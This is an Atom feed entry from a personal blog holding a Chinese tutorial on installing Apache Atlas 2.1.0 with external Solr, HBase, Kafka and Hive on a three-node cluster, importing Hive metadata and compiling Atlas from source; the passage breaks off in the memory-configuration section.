<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>星星的猫(&gt;^ω^&lt;)喵</title>
  
  
  <link href="https://blog.shawncoding.top/atom.xml" rel="self"/>
  
  <link href="https://blog.shawncoding.top/"/>
  <updated>2024-05-31T08:26:26.975Z</updated>
  <id>https://blog.shawncoding.top/</id>
  
  <author>
    <name>Shawn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>元数据管理Atlas</title>
    <link href="https://blog.shawncoding.top/posts/bc52513e.html"/>
    <id>https://blog.shawncoding.top/posts/bc52513e.html</id>
    <published>2024-05-31T08:24:01.000Z</published>
    <updated>2024-05-31T08:26:26.975Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Atlas概述</h1><h2 id="1、Atlas入门">1、Atlas入门</h2><p>Apache Atlas为组织提供开放式元数据管理和治理功能，用以构建其数据资产目录，对这些资产进行分类和管理，并为数据分析师和数据治理团队，提供围绕这些数据资产的协作功能。同时可以配合ranger对某个元数据进行权限管理</p><a id="more"></a><table><thead><tr><th>元数据分类</th><th>支持对元数据进行分类管理，例如个人信息，敏感信息等</th></tr></thead><tbody><tr><td>元数据检索</td><td>可按照元数据类型、元数据分类进行检索，支持全文检索</td></tr><tr><td>血缘依赖</td><td>支持表到表和字段到字段之间的血缘依赖，便于进行问题回溯和影响分析等</td></tr></tbody></table><p>例如表与表之间的血缘依赖</p><p><img src="http://qnypic.shawncoding.top/blog/202404161645767.png" alt></p><h2 id="2、Atlas架构原理">2、Atlas架构原理</h2><p><img src="http://qnypic.shawncoding.top/blog/202404161645768.png" alt></p><h1>二、Atlas安装</h1><blockquote><p>Atlas官网地址：<a href="https://atlas.apache.org/" target="_blank" rel="noopener" title="https://atlas.apache.org/">https://atlas.apache.org/</a><br>文档查看地址：<a href="https://atlas.apache.org/2.1.0/index.html" target="_blank" rel="noopener" title="https://atlas.apache.org/2.1.0/index.html">https://atlas.apache.org/2.1.0/index.html</a><br>下载地址：<a href="https://www.apache.org/dyn/closer.cgi/atlas/2.1.0/apache-atlas-2.1.0-sources.tar.gz" target="_blank" rel="noopener" title="https://www.apache.org/dyn/closer.cgi/atlas/2.1.0/apache-atlas-2.1.0-sources.tar.gz">https://www.apache.org/dyn/closer.cgi/atlas/2.1.0/apache-atlas-2.1.0-sources.tar.gz</a></p></blockquote><h2 id="1、安装环境准备">1、安装环境准备</h2><p>Atlas安装分为：集成自带的HBase + Solr；集成外部的HBase + Solr。通常企业开发中选择集成外部的HBase + Solr，方便项目整体进行集成操作</p><table><thead><tr><th>服务名称</th><th>子服务</th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>JDK</td><td></td><td>√</td><td>√</td><td>√</td></tr><tr><td>Zookeeper</td><td>QuorumPeerMain</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Kafka</td><td>Kafka</td><td>√</td><td>√</td><td>√</td></tr><tr><td>HBase</td><td>HMaster</td><td>√</td><td></td><td></td></tr><tr><td></td><td>HRegionServer</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Solr</td><td>Jar</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Hive</td><td>Hive</td><td>√</td><td></td><td></td></tr><tr><td>Atlas</td><td>atlas</td><td>√</td><td></td><td></td></tr><tr><td>服务数总计</td><td></td><td>13</td><td>7</td><td>7</td></tr></tbody></table><h3 id="1-1-安装Solr-7-7-3">1.1 安装Solr-7.7.3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在每台节点创建系统用户solr，三台机器都创建</span></span><br><span class="line">useradd solr</span><br><span class="line"><span class="built_in">echo</span> solr | passwd --stdin solr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压solr-7.7.3.tgz到/opt/module目录，并改名为solr,102节点</span></span><br><span class="line">wget https://archive.apache.org/dist/lucene/solr/7.7.3/solr-7.7.3.tgz</span><br><span class="line">tar -zxvf solr-7.7.3.tgz -C /opt/module/</span><br><span class="line">mv solr-7.7.3/ solr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改solr目录的所有者为solr用户</span></span><br><span class="line">chown -R solr:solr /opt/module/solr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改solr配置文件</span></span><br><span class="line"><span class="comment"># 修改/opt/module/solr/bin/solr.in.sh文件中的以下属性</span></span><br><span class="line">ZK_HOST=<span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分发solr</span></span><br><span class="line">xsync /opt/module/solr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动solr集群</span></span><br><span class="line"><span class="comment"># 启动Zookeeper集群</span></span><br><span class="line">zk.sh start</span><br><span class="line"><span class="comment"># 启动solr集群,出于安全考虑，不推荐使用root用户启动solr，此处使用solr用户，在所有节点执行以下命令启动solr集群</span></span><br><span class="line"><span class="comment"># 三台机器依次执行</span></span><br><span class="line">sudo -i -u solr /opt/module/solr/bin/solr start</span><br><span class="line"><span class="comment"># 出现 Happy Searching! 字样表明启动成功。</span></span><br><span class="line"><span class="comment"># 说明：若出现警告内容是：solr推荐系统允许的最大进程数和最大打开文件数分别为65000和65000，而系统默认值低于推荐值。如需修改可参考以下步骤，修改完需要重启方可生效，此处可暂不修改。</span></span><br><span class="line"><span class="comment"># 修改打开文件数限制</span></span><br><span class="line"><span class="comment"># 修改/etc/security/limits.conf文件，增加以下内容</span></span><br><span class="line"><span class="comment"># * soft nofile 65000</span></span><br><span class="line"><span class="comment"># * hard nofile 65000</span></span><br><span class="line"><span class="comment"># 修改进程数限制，修改/etc/security/limits.d/20-nproc.conf文件</span></span><br><span class="line"><span class="comment"># *          soft    nproc     65000</span></span><br><span class="line"><span class="comment"># 最后重启</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认端口为8983，可指定三台节点中的任意一台IP，http://hadoop102:8983 </span></span><br><span class="line"><span class="comment"># 提示：UI界面出现Cloud菜单栏时，Solr的Cloud模式才算部署成功</span></span><br></pre></td></tr></table></figure><h3 id="1-2-Atlas2-1-0安装">1.2 Atlas2.1.0安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文档：https://atlas.apache.org/#/BuildInstallation</span></span><br><span class="line"><span class="comment"># 可执行包涉及编译</span></span><br><span class="line"><span class="comment"># 把apache-atlas-2.1.0-server.tar.gz 上传到hadoop102的/opt/software目录下</span></span><br><span class="line">tar -zxvf apache-atlas-2.1.0-server.tar.gz -C /opt/module/</span><br><span class="line">mv /opt/module/apache-atlas-2.1.0 /opt/module/atlas</span><br><span class="line"><span class="comment"># # 资源获取：https://download.csdn.net/download/lemon_TT/87961006</span></span><br></pre></td></tr></table></figure><h2 id="2、Atlas配置">2、Atlas配置</h2><h3 id="2-1-Atlas集成Hbase">2.1 Atlas集成Hbase</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改/opt/module/atlas/conf/atlas-application.properties配置文件中的以下参数</span></span><br><span class="line">atlas.graph.storage.hostname=hadoop102:2181,hadoop103:2181,hadoop104:2181</span><br><span class="line"><span class="comment"># 修改/opt/module/atlas/conf/atlas-env.sh配置文件</span></span><br><span class="line"><span class="built_in">export</span> HBASE_CONF_DIR=/opt/module/hbase/conf</span><br></pre></td></tr></table></figure><h3 id="2-2-Atlas集成Solr">2.2 Atlas集成Solr</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改/opt/module/atlas/conf/atlas-application.properties配置文件中的以下参数</span></span><br><span class="line">atlas.graph.index.search.backend=solr</span><br><span class="line">atlas.graph.index.search.solr.mode=cloud</span><br><span class="line">atlas.graph.index.search.solr.zookeeper-url=hadoop102:2181,hadoop103:2181,hadoop104:2181</span><br><span class="line"><span class="comment"># 创建solr collection</span></span><br><span class="line">sudo -i -u solr /opt/module/solr/bin/solr create  -c vertex_index -d /opt/module/atlas/conf/solr -shards 3 -replicationFactor 2</span><br><span class="line">sudo -i -u solr /opt/module/solr/bin/solr create -c edge_index -d /opt/module/atlas/conf/solr -shards 3 -replicationFactor 2</span><br><span class="line">sudo -i -u solr /opt/module/solr/bin/solr create -c fulltext_index -d /opt/module/atlas/conf/solr -shards 3 -replicationFactor 2</span><br></pre></td></tr></table></figure><h3 id="2-3-Atlas集成Kafka">2.3 Atlas集成Kafka</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改/opt/module/atlas/conf/atlas-application.properties配置文件中的以下参数</span></span><br><span class="line">atlas.notification.embedded=<span class="literal">false</span></span><br><span class="line">atlas.kafka.data=/opt/module/kafka/data</span><br><span class="line">atlas.kafka.zookeeper.connect=hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka</span><br><span class="line">atlas.kafka.bootstrap.servers=hadoop102:9092,hadoop103:9092,hadoop104:9092</span><br></pre></td></tr></table></figure><h3 id="2-4-Atlas-Server配置">2.4 Atlas Server配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改/opt/module/atlas/conf/atlas-application.properties配置文件中的以下参数</span></span><br><span class="line"><span class="comment">#########  Server Properties  #########</span></span><br><span class="line">atlas.rest.address=http://hadoop102:21000</span><br><span class="line"><span class="comment"># If enabled and set to true, this will run setup steps when the server starts</span></span><br><span class="line">atlas.server.run.setup.on.start=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#########  Entity Audit Configs  #########</span></span><br><span class="line">atlas.audit.hbase.zookeeper.quorum=hadoop102:2181,hadoop103:2181,hadoop104:2181</span><br></pre></td></tr></table></figure><p>记录性能指标，进入<code>/opt/module/atlas/conf/</code>路径，修改当前目录下的atlas-log4j.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--去掉如下代码的注释--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"perf_appender"</span> <span class="attr">class</span>=<span class="string">"org.apache.log4j.DailyRollingFileAppender"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">value</span>=<span class="string">"$&#123;atlas.log.dir&#125;/atlas_perf.log"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"datePattern"</span> <span class="attr">value</span>=<span class="string">"'.'yyyy-MM-dd"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"append"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">"org.apache.log4j.PatternLayout"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"ConversionPattern"</span> <span class="attr">value</span>=<span class="string">"%d|%t|%m%n"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">"org.apache.atlas.perf"</span> <span class="attr">additivity</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">level</span> <span class="attr">value</span>=<span class="string">"debug"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"perf_appender"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-5-Kerberos相关配置">2.5 Kerberos相关配置</h3><p>若Hadoop集群开启了Kerberos认证，Atlas与Hadoop集群交互之前就需要先进行Kerberos认证。若Hadoop集群未开启Kerberos认证，则本节可跳过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为Atlas创建Kerberos主体，并生成keytab文件</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"addprinc -randkey atlas/hadoop102"</span></span><br><span class="line">kadmin -padmin/admin -wadmin -q<span class="string">"xst -k /etc/security/keytab/atlas.service.keytab atlas/hadoop102"</span></span><br><span class="line"><span class="comment"># 修改/opt/module/atlas/conf/atlas-application.properties配置文件</span></span><br><span class="line">atlas.authentication.method=kerberos</span><br><span class="line">atlas.authentication.principal=atlas/hadoop102@EXAMPLE.COM</span><br><span class="line">atlas.authentication.keytab=/etc/security/keytab/atlas.service.keytab</span><br></pre></td></tr></table></figure><h3 id="2-6-Atlas集成Hive">2.6 Atlas集成Hive</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压Hive Hook</span></span><br><span class="line">tar -zxvf apache-atlas-2.1.0-hive-hook.tar.gz</span><br><span class="line"><span class="comment"># 将Hive Hook依赖复制到Atlas安装路径</span></span><br><span class="line">cp -r apache-atlas-hive-hook-2.1.0/* /opt/module/atlas/</span><br><span class="line"><span class="comment"># 修改/opt/module/hive/conf/hive-env.sh配置文件</span></span><br><span class="line">mv hive-env.sh.template hive-env.sh</span><br><span class="line"><span class="comment"># 增加如下参数</span></span><br><span class="line"><span class="built_in">export</span> HIVE_AUX_JARS_PATH=/opt/module/atlas/hook/hive</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改Hive配置文件，在/opt/module/hive/conf/hive-site.xml文件中增加以下参数，配置Hive Hook。</span></span><br><span class="line">&lt;property&gt;</span><br><span class="line">      &lt;name&gt;hive.exec.post.hooks&lt;/name&gt;</span><br><span class="line">      &lt;value&gt;org.apache.atlas.hive.hook.HiveHook&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改/opt/module/atlas/conf/atlas-application.properties配置文件中的以下参数</span></span><br><span class="line"><span class="comment">######### Hive Hook Configs #######</span></span><br><span class="line">atlas.hook.hive.synchronous=<span class="literal">false</span></span><br><span class="line">atlas.hook.hive.numRetries=3</span><br><span class="line">atlas.hook.hive.queueSize=10000</span><br><span class="line">atlas.cluster.name=primary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将Atlas配置文件/opt/module/atlas/conf/atlas-application.properties拷贝到/opt/module/hive/conf目录</span></span><br><span class="line">cp /opt/module/atlas/conf/atlas-application.properties  /opt/module/hive/conf/</span><br></pre></td></tr></table></figure><h2 id="3、Atlas启动">3、Atlas启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动Atlas所依赖的环境</span></span><br><span class="line"><span class="comment"># 在NameNode节点执行以下命令，启动HDFS</span></span><br><span class="line">start-dfs.sh</span><br><span class="line"><span class="comment"># 在ResourceManager节点执行以下命令，启动Yarn</span></span><br><span class="line">start-yarn.sh</span><br><span class="line"><span class="comment"># 启动Zookeeper集群</span></span><br><span class="line">zk.sh start</span><br><span class="line"><span class="comment"># 启动Kafka集群</span></span><br><span class="line">kf.sh start</span><br><span class="line"><span class="comment"># 启动Hbase集群</span></span><br><span class="line"><span class="comment"># 在HMaster节点执行以下命令，使用hbase用户启动HBase</span></span><br><span class="line">sudo -i -u hbase start-hbase.sh</span><br><span class="line"><span class="comment"># 启动Solr集群</span></span><br><span class="line"><span class="comment"># 在所有节点执行以下命令，使用solr用户启动Solr</span></span><br><span class="line">sudo -i -u solr /opt/module/solr/bin/solr start</span><br><span class="line"><span class="comment"># 进入/opt/module/atlas路径，启动Atlas服务</span></span><br><span class="line">bin/atlas_start.py</span><br><span class="line"><span class="comment"># 错误信息查看路径：/opt/module/atlas/logs/*.out和application.log</span></span><br><span class="line"><span class="comment"># 停止Atlas服务命令为atlas_stop.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问Atlas的WebUI</span></span><br><span class="line"><span class="comment"># 访问地址：http://hadoop102:21000</span></span><br><span class="line"><span class="comment"># 注意：等待若干分钟。账户：admin，密码：admin</span></span><br></pre></td></tr></table></figure><h1>三、Atlas使用</h1><h2 id="1、介绍">1、介绍</h2><p>Atlas的使用相对简单，其主要工作是同步各服务（主要是Hive）的元数据，并构建元数据实体之间的关联关系，然后对所存储的元数据建立索引，最终未用户提供数据血缘查看及元数据检索等功能。</p><p>Atlas在安装之初，需手动执行一次元数据的全量导入，后续Atlas便会利用Hive Hook增量同步Hive的元数据。</p><h2 id="2、Hive元数据初次导入">2、Hive元数据初次导入</h2><p>Atlas提供了一个Hive元数据导入的脚本，直接执行该脚本，即可完成Hive元数据的初次全量导入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入Hive元数据</span></span><br><span class="line">/opt/module/atlas/hook-bin/import-hive.sh </span><br><span class="line"><span class="comment"># 按提示输入用户名：admin；输入密码：admin</span></span><br><span class="line"><span class="comment"># 等待片刻，出现以下日志，即表明导入成功:Hive Meta Data import was successful!!!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看Hive元数据</span></span><br><span class="line"><span class="comment"># 搜索hive_table类型的元数据，可已看到Atlas已经拿到了Hive元数据</span></span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202404161645769.png" alt></p><p>任选一张表查看血缘依赖关系,发现此时并未出现期望的血缘依赖，原因是Atlas是根据Hive所执行的SQL语句获取表与表之间以及字段与字段之间的依赖关系的，例如执行<code>insert into table_a select * from table_b</code>语句，Atlas就能获取table_a与table_b之间的依赖关系。此时并未执行任何SQL语句，故还不能出现血缘依赖关系</p><h2 id="3、Hive元数据增量同步">3、Hive元数据增量同步</h2><p>Hive元数据的增量同步，无需人为干预，只要Hive中的元数据发生变化（执行DDL语句），Hive Hook就会将元数据的变动通知Atlas。除此之外，Atlas还会根据DML语句获取数据之间的血缘关系</p><h1>四、扩展内容</h1><h2 id="1、Atlas源码编译">1、Atlas源码编译</h2><h3 id="1-1-安装Maven">1.1 安装Maven</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Maven下载：https://maven.apache.org/download.cgi</span></span><br><span class="line"><span class="comment"># 把apache-maven-3.6.1-bin.tar.gz上传到linux的/opt/software目录下</span></span><br><span class="line"><span class="comment"># 解压apache-maven-3.6.1-bin.tar.gz到/opt/module/目录下面</span></span><br><span class="line">tar -zxvf apache-maven-3.6.1-bin.tar.gz -C /opt/module/</span><br><span class="line"><span class="comment"># 修改apache-maven-3.6.1的名称为maven</span></span><br><span class="line">mv apache-maven-3.6.1/ maven</span><br><span class="line"><span class="comment"># 添加环境变量到/etc/profile中</span></span><br><span class="line"><span class="comment">#MAVEN_HOME</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/opt/module/maven</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$MAVEN_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">mvn -v</span><br></pre></td></tr></table></figure><p>修改setting.xml，指定为阿里云<code>vim /opt/module/maven/conf/settings.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 添加阿里云镜像--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus aliyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>UK Central<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://uk.maven.org/maven2<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>repo1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo1.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>repo2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo2.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-编译Atlas源码">1.2 编译Atlas源码</h3><blockquote><p><a href="https://www.apache.org/dyn/closer.cgi/atlas/2.1.0/apache-atlas-2.1.0-sources.tar.gz" target="_blank" rel="noopener" title="https://www.apache.org/dyn/closer.cgi/atlas/2.1.0/apache-atlas-2.1.0-sources.tar.gz">https://www.apache.org/dyn/closer.cgi/atlas/2.1.0/apache-atlas-2.1.0-sources.tar.gz</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把apache-atlas-2.1.0-sources.tar.gz上传到hadoop102的/opt/software目录下</span></span><br><span class="line"><span class="comment"># 解压apache-atlas-2.1.0-sources.tar.gz到/opt/module/目录下面</span></span><br><span class="line">tar -zxvf apache-atlas-2.1.0-sources.tar.gz -C /opt/module/</span><br><span class="line"><span class="comment"># 下载Atlas依赖</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_OPTS=<span class="string">"-Xms2g -Xmx2g"</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/apache-atlas-sources-2.1.0/</span><br><span class="line">mvn clean -DskipTests install</span><br><span class="line">mvn clean -DskipTests package -Pdis</span><br><span class="line"><span class="comment"># 一定要在$&#123;atlas_home&#125;执行</span></span><br><span class="line"><span class="built_in">cd</span> distro/target/</span><br><span class="line">mv apache-atlas-2.1.0-server.tar.gz /opt/software/</span><br><span class="line">mv apache-atlas-2.1.0-hive-hook.tar.gz /opt/software/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提示：执行过程比较长，会下载很多依赖，大约需要半个小时，期间如果报错很有可能是因为TimeOut造成的网络中断，重试即可</span></span><br></pre></td></tr></table></figure><h2 id="2、Atlas内存配置">2、Atlas内存配置</h2><p>如果计划存储数万个元数据对象，建议调整参数值获得最佳的JVM GC性能。以下是常见的服务器端选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改配置文件/opt/module/atlas/conf/atlas-env.sh</span></span><br><span class="line"><span class="comment">#设置Atlas内存</span></span><br><span class="line"><span class="built_in">export</span> ATLAS_SERVER_OPTS=<span class="string">"-server -XX:SoftRefLRUPolicyMSPerMB=0 -XX:+CMSClassUnloadingEnabled 